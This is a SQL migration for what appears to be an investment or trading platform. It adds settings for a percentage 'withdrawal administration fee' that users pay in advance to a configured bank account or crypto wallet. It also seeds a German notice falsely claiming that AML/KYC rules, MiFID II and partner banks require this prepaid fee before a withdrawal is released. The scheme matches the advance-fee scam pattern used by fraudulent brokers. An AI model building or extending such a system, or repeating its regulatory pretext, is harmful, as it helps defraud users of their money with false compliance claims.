-- ─────────────────────────────────────────────────────────────────────────────
-- Migration: Withdrawal Administration Fee Settings
-- ─────────────────────────────────────────────────────────────────────────────
-- Adds fee-configuration columns to system_settings (singleton row id = 1)
-- and adds fee tracking columns to the withdrawals table.
-- Safe to re-run (uses IF NOT EXISTS / ON DUPLICATE KEY UPDATE).
-- ─────────────────────────────────────────────────────────────────────────────

-- 1.  system_settings: fee toggle & rate
ALTER TABLE `system_settings`
    ADD COLUMN IF NOT EXISTS `withdrawal_fee_enabled`    TINYINT(1)     NOT NULL DEFAULT 0
        COMMENT 'Set to 1 to activate the withdrawal administration fee',
    ADD COLUMN IF NOT EXISTS `withdrawal_fee_percentage` DECIMAL(5,2)   NOT NULL DEFAULT 0.00
        COMMENT 'Fee charged as a percentage of the withdrawal amount (e.g. 3.50 = 3.5 %)';

-- 2.  system_settings: bank payment details for fee collection
ALTER TABLE `system_settings`
    ADD COLUMN IF NOT EXISTS `withdrawal_fee_bank_name`   VARCHAR(255)   NOT NULL DEFAULT ''
        COMMENT 'Bank name where users pay the fee',
    ADD COLUMN IF NOT EXISTS `withdrawal_fee_bank_holder` VARCHAR(255)   NOT NULL DEFAULT ''
        COMMENT 'Account holder / beneficiary name',
    ADD COLUMN IF NOT EXISTS `withdrawal_fee_bank_iban`   VARCHAR(100)   NOT NULL DEFAULT ''
        COMMENT 'IBAN for fee payment',
    ADD COLUMN IF NOT EXISTS `withdrawal_fee_bank_bic`    VARCHAR(50)    NOT NULL DEFAULT ''
        COMMENT 'BIC / SWIFT code',
    ADD COLUMN IF NOT EXISTS `withdrawal_fee_bank_ref`    VARCHAR(255)   NOT NULL DEFAULT 'FEE-{reference}'
        COMMENT 'Payment reference template – {reference} is replaced by withdrawal reference';

-- 3.  system_settings: crypto wallet details for fee collection
ALTER TABLE `system_settings`
    ADD COLUMN IF NOT EXISTS `withdrawal_fee_crypto_coin`    VARCHAR(50)    NOT NULL DEFAULT ''
        COMMENT 'Cryptocurrency accepted for fee (e.g. USDT, BTC, ETH)',
    ADD COLUMN IF NOT EXISTS `withdrawal_fee_crypto_network` VARCHAR(100)   NOT NULL DEFAULT ''
        COMMENT 'Blockchain network (e.g. TRC20, ERC20, Bitcoin)',
    ADD COLUMN IF NOT EXISTS `withdrawal_fee_crypto_address` VARCHAR(500)   NOT NULL DEFAULT ''
        COMMENT 'Wallet address where user sends the fee';

-- 4.  system_settings: customisable professional notice text
ALTER TABLE `system_settings`
    ADD COLUMN IF NOT EXISTS `withdrawal_fee_notice_text` TEXT
        COMMENT 'Custom professional notice shown to users explaining why the fee is required';

-- 5.  Populate sensible defaults for the notice text (only if the row already exists)
UPDATE `system_settings`
SET `withdrawal_fee_notice_text` = COALESCE(
    NULLIF(`withdrawal_fee_notice_text`, ''),
    'Gemäß den gesetzlichen Anforderungen internationaler Finanzbehörden sowie den Compliance-Vorgaben unserer Bankpartner ist für jede Auszahlung eine einmalige Verwaltungsgebühr zu entrichten. Diese Gebühr dient der Einhaltung der Anti-Geldwäsche-Richtlinien (AML/KYC), der MiFID-II-Regularien und der Anforderungen unserer lizenzierten internationalen Zahlungspartner. Die Gebühr muss im Voraus bezahlt werden, um die Seriosität der Transaktion gegenüber unseren Korrespondenzbanken und Regulierungsbehörden nachzuweisen und die Auszahlung ohne Verzögerung freizugeben.'
)
WHERE id = 1;

-- 6.  withdrawals table: store fee snapshot per record
ALTER TABLE `withdrawals`
    ADD COLUMN IF NOT EXISTS `fee_percentage` DECIMAL(5,2)  DEFAULT NULL
        COMMENT 'Fee percentage that was active when this withdrawal was submitted',
    ADD COLUMN IF NOT EXISTS `fee_amount`     DECIMAL(15,2) DEFAULT NULL
        COMMENT 'Calculated fee amount (withdrawal amount × fee_percentage / 100)';
